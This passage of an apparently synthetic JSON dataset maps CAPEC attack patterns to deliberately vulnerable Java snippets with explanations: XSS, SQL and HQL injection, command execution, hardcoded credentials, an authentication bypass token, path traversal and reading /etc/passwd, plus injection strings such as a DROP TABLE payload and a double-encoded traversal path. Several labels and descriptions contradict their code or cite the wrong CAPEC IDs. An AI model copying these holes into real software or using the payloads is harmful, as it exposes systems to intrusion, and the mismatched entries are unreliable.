        "code_snippet": "import java.io.IOException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    private static final Logger logger = Logger.getLogger(VulnerableServlet.class.getName());\n\n    static {\n        try {\n            FileHandler fh = new FileHandler(\"app.log\", true);\n            fh.setFormatter(new SimpleFormatter());\n            logger.addHandler(fh);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"input\");\n        logger.info(\"User input: \" + userInput);\n\n        // Incomplete denylist for XSS\n        if (userInput.contains(\"<script>\")) {\n            userInput = userInput.replace(\"<script>\", \"\");\n        }\n\n        response.getWriter().println(\"User input: \" + userInput);\n    }\n}",
        "description": "This Java servlet demonstrates a vulnerability where user input is logged and then displayed on a web page without proper sanitization, leading to potential Cross-Site Scripting (XSS) attacks. The code uses an incomplete denylist approach to filter out script tags, which is insufficient and can be bypassed by attackers using different XSS payloads. The logger writes user input to a log file, which could be exploited if the logs are viewed in a web context, leading to XSS through log files. This snippet embodies the main idea of the deprecated CAPEC by showing how improper input handling and logging can lead to security vulnerabilities."
    },
    {
        "capec_id": "107",
        "capec_name": "Cross Site Tracing",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // CWE-693: Protection Mechanism Failure\n        // No protection mechanism to prevent TRACE method\n        if (\"TRACE\".equalsIgnoreCase(request.getMethod())) {\n            response.setStatus(HttpServletResponse.SC_METHOD_NOT_ALLOWED);\n            return;\n        }\n\n        // CWE-79: Improper Neutralization of Input During Web Page Generation\n        String userInput = request.getParameter(\"input\");\n        response.getWriter().println(\"<html><body>\" + userInput + \"</body></html>\");\n    }\n\n    protected void doTrace(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // CWE-648: Incorrect Use of Privileged APIs\n        // Allowing TRACE method which can expose sensitive information\n        response.setStatus(HttpServletResponse.SC_OK);\n        response.getWriter().println(\"TRACE method is enabled\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability to Cross Site Tracing (XST). The doGet method does not properly handle user input, leading to potential Cross-Site Scripting (CWE-79). The doTrace method allows the TRACE HTTP method, which can expose sensitive information such as session cookies (CWE-648). The code also lacks proper protection mechanisms to prevent the TRACE method (CWE-693). This combination of issues can enable an attacker to steal authentication credentials by exploiting the TRACE method."
    },
    {
        "capec_id": "108",
        "capec_name": "Command Line Execution through SQL Injection",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.Statement;\n\npublic class VulnerableSQLInjection {\n    public static void main(String[] args) {\n        String userInput = \"'; DROP TABLE users; --\"; // Simulated malicious input\n        String query = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n\n        try {\n            Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"user\", \"password\");\n            Statement stmt = conn.createStatement();\n            ResultSet rs = stmt.executeQuery(query);\n\n            while (rs.next()) {\n                String command = rs.getString(\"command\");\n                Runtime.getRuntime().exec(command); // Potential OS Command Injection\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where an attacker can inject SQL commands through user input, leading to SQL Injection (CWE-89). The injected SQL command can manipulate the database query, potentially leading to the execution of unintended commands. The code then retrieves data from the database and uses it as an argument for an OS command without proper validation, leading to OS Command Injection (CWE-78). This embodies the main idea of CAPEC-66, where SQL Injection is used to inject data that is later executed as a command on the host system."
    },
    {
        "capec_id": "109",
        "capec_name": "Object Relational Mapping Injection",
        "code_snippet": "import org.hibernate.Session;\nimport org.hibernate.query.Query;\n\npublic class ORMInjectionExample {\n    public void getUserData(Session session, String userId) {\n        // Vulnerable code: directly using user input in HQL query\n        String hql = \"FROM User WHERE id = '\" + userId + \"'\";\n        Query query = session.createQuery(hql);\n        User user = (User) query.uniqueResult();\n        System.out.println(user);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to Object Relational Mapping (ORM) Injection using Hibernate. The method `getUserData` takes a Hibernate `Session` and a `userId` as input. It constructs an HQL (Hibernate Query Language) query by directly concatenating the `userId` into the query string. This approach is vulnerable to SQL injection because an attacker can manipulate the `userId` input to alter the query's logic or execute arbitrary SQL commands. This example embodies the main idea of CAPEC-20, highlighting the risk of improper input validation (CWE-20) and improper neutralization of special elements in SQL commands (CWE-89, CWE-943)."
    },
    {
        "capec_id": "110",
        "capec_name": "SQL Injection through SOAP Parameter Tampering",
        "code_snippet": "import javax.xml.soap.*;\nimport java.sql.*;\n\npublic class SOAPSQLInjectionExample {\n    public static void main(String[] args) throws Exception {\n        // Simulate receiving a SOAP message\n        String soapMessage = \"<soap:Envelope xmlns:soap=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\"><soap:Body><getUser><username>admin' OR '1'='1</username></getUser></soap:Body></soap:Envelope>\";\n\n        // Parse the SOAP message\n        MessageFactory factory = MessageFactory.newInstance();\n        SOAPMessage message = factory.createMessage(null, new java.io.ByteArrayInputStream(soapMessage.getBytes()));\n        SOAPBody body = message.getSOAPBody();\n        String username = body.getElementsByTagName(\"username\").item(0).getTextContent();\n\n        // Vulnerable SQL query construction\n        String query = \"SELECT * FROM users WHERE username = '\" + username + \"'\";\n\n        // Database connection setup\n        Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"user\", \"password\");\n        Statement stmt = conn.createStatement();\n\n        // Execute the query\n        ResultSet rs = stmt.executeQuery(query);\n\n        // Process the result set\n        while (rs.next()) {\n            System.out.println(\"User: \" + rs.getString(\"username\"));\n        }\n\n        // Close resources\n        rs.close();\n        stmt.close();\n        conn.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a SQL Injection vulnerability through SOAP parameter tampering. The code simulates receiving a SOAP message containing a username parameter, which is then extracted and used directly in an SQL query without proper validation or parameter binding. This allows an attacker to inject malicious SQL code through the SOAP message, potentially gaining unauthorized access to the database. The code highlights the importance of proper input validation and the use of prepared statements to prevent SQL Injection attacks."
    },
    {
        "capec_id": "111",
        "capec_name": "JSON Hijacking (aka JavaScript Hijacking)",
        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\nimport java.io.PrintWriter;\n\npublic class VulnerableJSONServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        response.setContentType(\"application/json\");\n        PrintWriter out = response.getWriter();\n\n        // Simulated sensitive data\n        String jsonData = \"{\\\"user\\\": \\\"admin\\\", \\\"email\\\": \\\"admin@example.com\\\"}\";\n\n        // No origin validation or CSRF protection\n        out.print(jsonData);\n        out.flush();\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability to JSON Hijacking. The servlet responds to GET requests by sending JSON data containing sensitive information without verifying the origin of the request or implementing CSRF protection. This lack of validation allows an attacker to include and execute this JSON data in the context of another website, potentially stealing confidential information. The code also does not neutralize user input, which could lead to Cross-Site Scripting (XSS) attacks if the JSON data were dynamically generated based on user input."
    },
    {
        "capec_id": "112",
        "capec_name": "Brute Force",
        "code_snippet": "import java.security.SecureRandom;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class BruteForceVulnerable {\n    private static final int MAX_ATTEMPTS = 1000;\n    private static final Map<String, String> users = new HashMap<>();\n    private static final SecureRandom random = new SecureRandom();\n\n    public static void main(String[] args) {\n        // Adding a user with a weak password\n        users.put(\"user1\", \"password123\");\n\n        // Simulating brute force attack\n        String username = \"user1\";\n        for (int i = 0; i < MAX_ATTEMPTS; i++) {\n            String attempt = generateWeakPassword();\n            if (authenticate(username, attempt)) {\n                System.out.println(\"Access granted with password: \" + attempt);\n                break;\n            }\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        return users.containsKey(username) && users.get(username).equals(password);\n    }\n\n    private static String generateWeakPassword() {\n        // Generating a weak password (insufficiently random)\n        int num = random.nextInt(1000); // Weak randomness\n        return \"password\" + num;\n    }\n}",
        "description": "This Java code snippet demonstrates a system vulnerable to brute force attacks. It includes several weaknesses: weak password requirements (CWE-521), insufficiently random values (CWE-330), and improper restriction of excessive authentication attempts (CWE-307). The code simulates a brute force attack by attempting to guess a user's password through trial and error. The `generateWeakPassword` method produces weak passwords using insufficient randomness, making it easier for an attacker to guess the correct password. The `authenticate` method checks the guessed password against stored user credentials without any rate limiting, allowing for multiple attempts in a short time frame."
    },
    {
        "capec_id": "113",
        "capec_name": "Interface Manipulation",
        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class InterfaceManipulationExample {\n    private static final String DEBUG_MODE_FILE = \"/sys/hardware/debug_mode\";\n    private static final String REGISTER_FILE = \"/sys/hardware/register\";\n\n    public static void main(String[] args) {\n        try {\n            // Improper access control for register interface (CWE-1262)\n            String registerValue = new String(Files.readAllBytes(Paths.get(REGISTER_FILE)));\n            System.out.println(\"Register Value: \" + registerValue);\n\n            // Exposed IOCTL with insufficient access control (CWE-782)\n            if (args.length > 0 && args[0].equals(\"enable_debug\")) {\n                enableDebugMode();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void enableDebugMode() throws IOException {\n        // Hardware allows activation of test or debug logic at runtime (CWE-1313)\n        Files.write(Paths.get(DEBUG_MODE_FILE), \"1\".getBytes());\n        System.out.println(\"Debug mode enabled.\");\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary can manipulate hardware interfaces due to improper access control and exposed IOCTLs. The `main` method reads a value from a hardware register file (`REGISTER_FILE`) without proper access control (CWE-1262). Additionally, it allows enabling debug mode by writing to a debug mode file (`DEBUG_MODE_FILE`) if a specific argument is provided, representing an exposed IOCTL with insufficient access control (CWE-782). The `enableDebugMode` method activates debug logic at runtime, which can alter the hardware's behavior (CWE-1313). This code embodies the main idea of CAPEC-225 (Interface Manipulation) by showing how improper handling of hardware interfaces can lead to security vulnerabilities."
    },
    {
        "capec_id": "114",
        "capec_name": "Authentication Abuse",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class AuthenticationService {\n    private Map<String, String> users = new HashMap<>();\n    private int failedAttempts = 0;\n    private static final int MAX_ATTEMPTS = 5;\n\n    public AuthenticationService() {\n        // Adding a user with a weak password for demonstration\n        users.put(\"admin\", \"password\");\n    }\n\n    public boolean authenticate(String username, String password) {\n        if (failedAttempts >= MAX_ATTEMPTS) {\n            System.out.println(\"Account locked due to too many failed attempts.\");\n            return false;\n        }\n\n        if (users.containsKey(username) && users.get(username).equals(password)) {\n            failedAttempts = 0; // Reset failed attempts on successful login\n            return true;\n        } else {\n            failedAttempts++;\n            return false;\n        }\n    }\n\n    public static void main(String[] args) {\n        AuthenticationService authService = new AuthenticationService();\n\n        // Simulating authentication attempts\n        System.out.println(authService.authenticate(\"admin\", \"wrongpassword\")); // false\n        System.out.println(authService.authenticate(\"admin\", \"wrongpassword\")); // false\n        System.out.println(authService.authenticate(\"admin\", \"wrongpassword\")); // false\n        System.out.println(authService.authenticate(\"admin\", \"wrongpassword\")); // false\n        System.out.println(authService.authenticate(\"admin\", \"wrongpassword\")); // false\n        System.out.println(authService.authenticate(\"admin\", \"password\")); // false, account locked\n    }\n}",
        "description": "This Java code snippet demonstrates an authentication service that embodies the main idea of CAPEC-Authentication Abuse. The code includes several related CWEs: \n\n1. CWE-287 (Improper Authentication): The authentication mechanism checks if the username and password match, but it uses a weak password ('password') for the 'admin' user, which is easily guessable.\n\n2. CWE-307 (Improper Restriction of Excessive Authentication Attempts): The code attempts to limit the number of failed authentication attempts to 5. However, it does not implement any delay or lockout mechanism, making it susceptible to brute force attacks.\n\n3. CWE-1390 (Weak Authentication): The authentication mechanism does not sufficiently prove the claimed identity is correct, as it relies on a simple username-password check without additional security measures.\n\nThe code represents the idea of an attacker exploiting weaknesses in the authentication mechanism to gain unauthorized access. The attacker can repeatedly attempt to log in with different passwords, and the weak password for the 'admin' user makes it easier to guess the correct password."
    },
    {
        "capec_id": "115",
        "capec_name": "Authentication Bypass",
        "code_snippet": "public class AuthenticationService {\n    private static final String HARDCODED_PASSWORD = \"password123\";\n\n    public boolean authenticate(String username, String password) {\n        // CWE-287: Improper Authentication\n        if (username.equals(\"admin\") && password.equals(HARDCODED_PASSWORD)) {\n            return true;\n        }\n        return false;\n    }\n\n    public boolean bypassAuthentication(String token) {\n        // CWE-288: Authentication Bypass Using an Alternate Path or Channel\n        if (token.equals(\"bypassToken\")) {\n            return true;\n        }\n        return false;\n    }\n\n    public static void main(String[] args) {\n        AuthenticationService authService = new AuthenticationService();\n\n        // Attempt to authenticate with username and password\n        if (authService.authenticate(\"admin\", \"password123\")) {\n            System.out.println(\"Authenticated as admin\");\n        } else {\n            System.out.println(\"Authentication failed\");\n        }\n\n        // Attempt to bypass authentication using a token\n        if (authService.bypassAuthentication(\"bypassToken\")) {\n            System.out.println(\"Authentication bypassed\");\n        } else {\n            System.out.println(\"Authentication bypass failed\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an authentication service that is vulnerable to authentication bypass. The `authenticate` method checks if the provided username and password match hardcoded values, representing CWE-287 (Improper Authentication). The `bypassAuthentication` method allows bypassing the authentication process using a specific token, representing CWE-288 (Authentication Bypass Using an Alternate Path or Channel). The main method shows how an attacker could either authenticate with the hardcoded credentials or bypass authentication entirely using the token. This embodies the main idea of CAPEC-115 (Authentication Bypass), where an attacker gains unauthorized access by circumventing the authentication mechanism."
    },
    {
        "capec_id": "116",
        "capec_name": "Excavation",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\n\npublic class SensitiveInfoExposure {\n    public static void main(String[] args) {\n        try {\n            // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n            String sensitiveData = new String(Files.readAllBytes(Paths.get(\"/etc/passwd\")));\n            System.out.println(\"Sensitive Data: \" + sensitiveData);\n\n            // CWE-426: Untrusted Search Path\n            ProcessBuilder pb = new ProcessBuilder(\"/usr/bin/env\", \"ls\");\n            pb.directory(new File(\"/tmp\"));\n            Process p = pb.start();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Excavation' by actively probing and exposing sensitive information. The code reads and prints the contents of the '/etc/passwd' file, which is a sensitive file containing user account information (CWE-200: Exposure of Sensitive Information to an Unauthorized Actor). Additionally, it uses an untrusted search path to execute the 'ls' command in the '/tmp' directory (CWE-426: Untrusted Search Path). This combination of actions illustrates how an adversary might probe a system to gather sensitive information and leverage untrusted paths to execute commands, potentially leading to further exploitation."
    },
    {
        "capec_id": "117",
        "capec_name": "Interception",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class CleartextTransmission {\n    public static void main(String[] args) {\n        String serverAddress = \"example.com\";\n        int port = 80;\n        try (Socket socket = new Socket(serverAddress, port);\n             OutputStream out = socket.getOutputStream();\n             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {\n\n            // Sending sensitive information in cleartext\n            String sensitiveData = \"username=admin&password=12345\";\n            out.write((\"POST /login HTTP/1.1\\r\\n\" +\n                       \"Host: \" + serverAddress + \"\\r\\n\" +\n                       \"Content-Length: \" + sensitiveData.length() + \"\\r\\n\" +\n                       \"Content-Type: application/x-www-form-urlencoded\\r\\n\\r\\n\" +\n                       sensitiveData).getBytes());\n            out.flush();\n\n            // Reading the response\n            String responseLine;\n            while ((responseLine = in.readLine()) != null) {\n                System.out.println(responseLine);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the transmission of sensitive information (username and password) in cleartext over a network. The code establishes a socket connection to a server and sends a POST request with sensitive data in the body. This embodies the main idea of the CAPEC 'Interception' by showing how an adversary could potentially intercept this cleartext transmission. The code also touches on CWE-319 (Cleartext Transmission of Sensitive Information) by not encrypting the sensitive data, making it vulnerable to sniffing by unauthorized actors."
    },
    {
        "capec_id": "120",
        "capec_name": "Double Encoding",
        "code_snippet": "import java.net.URLDecoder;\nimport java.nio.charset.StandardCharsets;\n\npublic class DoubleEncodingExample {\n    public static void main(String[] args) {\n        String input = \"%252E%252E%252F%252E%252E%252Fetc%252Fpasswd\"; // Double encoded path traversal attempt\n        String decodedOnce = URLDecoder.decode(input, StandardCharsets.UTF_8);\n        String decodedTwice = URLDecoder.decode(decodedOnce, StandardCharsets.UTF_8);\n\n        // Improper handling: only one level of decoding\n        if (isPathTraversal(decodedOnce)) {\n            System.out.println(\"Path traversal attempt detected (single decoding)\");\n        } else {\n            System.out.println(\"No path traversal attempt detected (single decoding)\");\n        }\n\n        // Proper handling: double decoding\n        if (isPathTraversal(decodedTwice)) {\n            System.out.println(\"Path traversal attempt detected (double decoding)\");\n        } else {\n            System.out.println(\"No path traversal attempt detected (double decoding)\");\n        }\n    }\n\n    private static boolean isPathTraversal(String input) {\n        return input.contains(\"../\") || input.contains(\"..\\\\\");\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of double encoding, where an input is encoded twice to bypass security filters. The input string \"%252E%252E%252F%252E%252E%252Fetc%252Fpasswd\" represents a double-encoded path traversal attempt. The code decodes the input once and checks for path traversal patterns, which may not be detected. It then decodes the input a second time and checks again, successfully identifying the path traversal attempt. This highlights the importance of handling multiple levels of encoding to prevent security vulnerabilities such as improper input validation (CWE-20), improper handling of URL encoding (CWE-177), and incomplete list of disallowed inputs (CWE-184)."
    },
    {
        "capec_id": "121",
        "capec_name": "Exploit Non-Production Interfaces",
        "code_snippet": "public class ProductionSystem {\n    private boolean debugMode = true; // CWE-489: Active Debug Code\n\n    public void processRequest(String request) {\n        if (debugMode) {\n            System.out.println(\"Debug Info: Processing request: \" + request); // CWE-1295: Debug Messages Revealing Unnecessary Information\n        }\n        // Process the request\n    }\n\n    public static void main(String[] args) {\n        ProductionSystem system = new ProductionSystem();\n        system.processRequest(\"SensitiveOperation\");\n    }\n}",
        "description": "This Java code snippet represents a production system with an active debug mode (CWE-489). The debug mode is enabled, and it prints debug information, including potentially sensitive data (CWE-1295). This scenario embodies the main idea of CAPEC-111: 'Exploit Non-Production Interfaces,' where an adversary can exploit the debug interface unintentionally left enabled in a production environment to glean information or leverage functionality that should not be available."
    },
    {
        "capec_id": "122",
        "capec_name": "Privilege Abuse",
        "code_snippet": "public class PrivilegeAbuseExample {\n    private boolean isAdmin = false;\n\n    public void setAdmin(boolean isAdmin) {\n        this.isAdmin = isAdmin;\n    }\n\n    public void performAdminTask() {\n        if (isAdmin) {\n            System.out.println(\"Admin task performed.\");\n        } else {\n            System.out.println(\"Access denied. Admin privileges required.\");\n        }\n    }\n\n    public static void main(String[] args) {\n        PrivilegeAbuseExample user = new PrivilegeAbuseExample();\n        user.setAdmin(true); // Improper privilege management\n        user.performAdminTask(); // Admin task performed\n\n        PrivilegeAbuseExample nonPrivilegedUser = new PrivilegeAbuseExample();\n        nonPrivilegedUser.performAdminTask(); // Access denied\n    }\n}",
        "description": "This Java code snippet demonstrates a simple example of privilege abuse. The `PrivilegeAbuseExample` class has a boolean field `isAdmin` that determines if a user has admin privileges. The `setAdmin` method allows setting this field, and the `performAdminTask` method performs an admin task if the user has admin privileges. The main method creates two instances of `PrivilegeAbuseExample`: one with admin privileges and one without. The code highlights improper privilege management (CWE-269) by allowing any user to set themselves as an admin, leading to potential privilege abuse. This example embodies the main idea of the CAPEC by showing how features meant for privileged users can be exploited by non-privileged users."
    },
    {
        "capec_id": "123",
        "capec_name": "Buffer Manipulation",
        "code_snippet": "public class BufferManipulationExample {\n    public static void main(String[] args) {\n        int bufferSize = 10;\n        char[] buffer = new char[bufferSize];\n        String input = \"This input is too long for the buffer\";\n\n        // CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n        for (int i = 0; i <= input.length(); i++) {\n            buffer[i] = input.charAt(i); // Potential buffer overflow\n        }\n\n        // CWE-126: Buffer Over-read\n        for (int i = 0; i <= bufferSize; i++) {\n            System.out.print(buffer[i]); // Potential buffer over-read\n        }\n\n        // CWE-1285: Improper Validation of Specified Index, Position, or Offset in Input\n        int index = 15; // Invalid index\n        if (index < bufferSize) {\n            System.out.println(buffer[index]);\n        } else {\n            System.out.println(\"Index out of bounds\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates several common buffer manipulation vulnerabilities. The main idea is to show how improper handling of buffer boundaries can lead to security issues. The code includes:\n\n1. **CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer** - The loop writes to the buffer without checking if the index exceeds the buffer size, leading to a potential buffer overflow.\n2. **CWE-126: Buffer Over-read** - The loop reads from the buffer without proper boundary checks, which can cause reading beyond the buffer's allocated memory.\n3. **CWE-1285: Improper Validation of Specified Index, Position, or Offset in Input** - The code attempts to access an index that is out of bounds without proper validation, demonstrating how improper index validation can lead to errors.\n\nThese examples illustrate how buffer manipulation can lead to vulnerabilities if proper checks and validations are not implemented."
    },
    {
        "capec_id": "124",
        "capec_name": "Shared Resource Manipulation",
        "code_snippet": "import java.util.concurrent.locks.ReentrantLock;\n\npublic class SharedResourceManipulation {\n    private static int sharedResource = 0;\n    private static ReentrantLock lock = new ReentrantLock();\n\n    public static void main(String[] args) {\n        Thread thread1 = new Thread(() -> manipulateResource());\n        Thread thread2 = new Thread(() -> manipulateResource());\n\n        thread1.start();\n        thread2.start();\n    }\n\n    public static void manipulateResource() {\n        for (int i = 0; i < 1000; i++) {\n            lock.lock();\n            try {\n                // Critical section: accessing shared resource\n                sharedResource++;\n                System.out.println(Thread.currentThread().getName() + \" updated sharedResource to: \" + sharedResource);\n            } finally {\n                lock.unlock();\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where multiple threads manipulate a shared resource, which is a common theme in the CAPEC description of 'Shared Resource Manipulation'. The shared resource is an integer variable 'sharedResource'. The code uses a ReentrantLock to synchronize access to this shared resource, which is an attempt to prevent improper synchronization (CWE-662). However, if the lock mechanism is not used correctly or if there are other vulnerabilities in the system, it could lead to issues such as data corruption or crashes. This example highlights the importance of proper synchronization when multiple threads or processes access shared resources."
    },
    {
        "capec_id": "125",
        "capec_name": "Flooding",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class FloodingVulnerableServer {\n    private static final int PORT = 8080;\n    private static final int MAX_THREADS = 1000; // No limit on the number of threads\n\n    public static void main(String[] args) {\n        ExecutorService executor = Executors.newFixedThreadPool(MAX_THREADS);\n        try (ServerSocket serverSocket = new ServerSocket(PORT)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                executor.submit(() -> handleClient(clientSocket));\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void handleClient(Socket clientSocket) {\n        try {\n            // Simulate handling client request\n            Thread.sleep(1000);\n            clientSocket.close();\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a server that is vulnerable to a flooding attack. The server listens on port 8080 and uses a fixed thread pool with a high limit (MAX_THREADS = 1000) to handle incoming client connections. The handleClient method simulates processing a client request by sleeping for 1 second before closing the connection. The vulnerability lies in the lack of proper resource management and throttling, as the server can be overwhelmed by a large number of incoming connections, leading to resource exhaustion. This demonstrates CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-400 (Uncontrolled Resource Consumption)."
    },
    {
        "capec_id": "126",
        "capec_name": "Path Traversal",
        "code_snippet": "import java.io.*;\n\npublic class PathTraversalExample {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java PathTraversalExample <filename>\");\n            return;\n        }\n\n        String filename = args[0];\n        String basePath = \"/var/www/uploads/\";\n        File file = new File(basePath + filename);\n\n        try (BufferedReader br = new BufferedReader(new FileReader(file))) {\n            String line;\n            while ((line = br.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of a path traversal vulnerability. The program takes a filename as a command-line argument and attempts to read and print the contents of the file located in the '/var/www/uploads/' directory. However, it does not properly validate or sanitize the input filename, allowing an attacker to use sequences like '../' to traverse directories and access files outside the intended directory. This embodies the main idea of the CAPEC and related CWEs, where improper input validation allows unauthorized access to files."
    },
    {
        "capec_id": "127",
        "capec_name": "Directory Indexing",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class DirectoryListingServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String dirPath = request.getParameter(\"dir\");\n        File dir = new File(dirPath);\n        if (dir.isDirectory()) {\n            PrintWriter out = response.getWriter();\n            out.println(\"<html><body>\");\n            out.println(\"<h1>Directory Listing</h1>\");\n            out.println(\"<ul>\");\n            for (String file : dir.list()) {\n                out.println(\"<li>\" + file + \"</li>\");\n            }\n            out.println(\"</ul>\");\n            out.println(\"</body></html>\");\n        } else {\n            response.sendError(HttpServletResponse.SC_NOT_FOUND, \"Directory not found\");\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable implementation of directory indexing. The servlet takes a directory path as a request parameter and lists the contents of the directory if it exists. This can expose sensitive files and directories to unauthorized users, leading to potential security breaches. The code does not perform any authorization checks (CWE-285), does not protect against forced browsing (CWE-425), and may expose critical resources with incorrect permissions (CWE-732). This snippet embodies the main idea of CAPEC-126 (Directory Indexing) by allowing an adversary to explore the directory tree and learn the names of files, which can be used for further attacks."
    },
    {
        "capec_id": "128",
        "capec_name": "Integer Attacks",
        "code_snippet": "public class IntegerAttackExample {\n    public static void main(String[] args) {\n        int maxValue = Integer.MAX_VALUE;\n        int result = maxValue + 1; // CWE-190: Integer Overflow\n        \n        if (result < 0) { // CWE-839: Numeric Range Comparison Without Minimum Check\n            System.out.println(\"Integer overflow occurred!\");\n        }\n        \n        short smallValue = -1;\n        int extendedValue = smallValue; // CWE-194: Unexpected Sign Extension\n        \n        if (extendedValue > 0) {\n            System.out.println(\"Unexpected sign extension occurred!\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates several integer-related vulnerabilities. The first part of the code adds 1 to the maximum value of an integer, causing an integer overflow (CWE-190). The result is then checked to see if it is negative, which it will be due to the overflow, illustrating a numeric range comparison without a minimum check (CWE-839). The second part of the code shows an unexpected sign extension (CWE-194) by assigning a negative short value to an integer, which can lead to incorrect behavior if the sign extension is not handled properly. This code embodies the main idea of CAPEC-Integer Attacks by showing how integer operations can lead to unexpected and potentially exploitable results."
    },
    {
        "capec_id": "129",
        "capec_name": "Pointer Manipulation",
        "code_snippet": "public class PointerManipulationExample {\n    public static void main(String[] args) {\n        int[] array = new int[10];\n        int index = 15; // Incorrect calculation leading to out-of-bounds access\n        \n        // CWE-823: Use of Out-of-range Pointer Offset\n        int value = array[index]; // This will cause an ArrayIndexOutOfBoundsException\n        \n        // CWE-822: Untrusted Pointer Dereference\n        int untrustedIndex = getUntrustedIndex();\n        int untrustedValue = array[untrustedIndex]; // Potentially unsafe dereference\n        \n        // CWE-476: NULL Pointer Dereference\n        int[] nullArray = null;\n        int nullValue = nullArray[0]; // This will cause a NullPointerException\n    }\n    \n    private static int getUntrustedIndex() {\n        // Simulate getting an index from an untrusted source\n        return 20; // Out-of-bounds index\n    }\n}",
        "description": "This Java code snippet demonstrates several vulnerabilities related to pointer manipulation as described in the CAPEC. The main idea is to show how incorrect pointer arithmetic and untrusted pointer dereference can lead to accessing unintended memory locations. The code includes:\n\n1. **CWE-823: Use of Out-of-range Pointer Offset** - Accessing an array with an index that is out of bounds, which can lead to an ArrayIndexOutOfBoundsException.\n2. **CWE-822: Untrusted Pointer Dereference** - Using an index obtained from an untrusted source to access an array, which can be unsafe and lead to unexpected behavior.\n3. **CWE-476: NULL Pointer Dereference** - Dereferencing a null pointer, which will cause a NullPointerException.\n\nThese examples illustrate how improper handling of pointers and array indices can lead to vulnerabilities and potential security issues in an application."
    },
    {
        "capec_id": "130",
        "capec_name": "Excessive Allocation",
        "code_snippet": "import java.util.ArrayList;\nimport java.util.List;\n\npublic class ExcessiveAllocationExample {\n    private static List<byte[]> memoryHog = new ArrayList<>();\n\n    public static void main(String[] args) {\n        try {\n            // Simulate a request that causes excessive memory allocation\n            allocateExcessiveMemory(1000000); // Allocate 1 million chunks of memory\n        } catch (OutOfMemoryError e) {\n            System.err.println(\"Out of memory: \" + e.getMessage());\n        }\n    }\n\n    private static void allocateExcessiveMemory(int chunks) {\n        for (int i = 0; i < chunks; i++) {\n            // Allocate 1MB chunks of memory without any limit\n            memoryHog.add(new byte[1024 * 1024]);\n        }\n    }\n}",
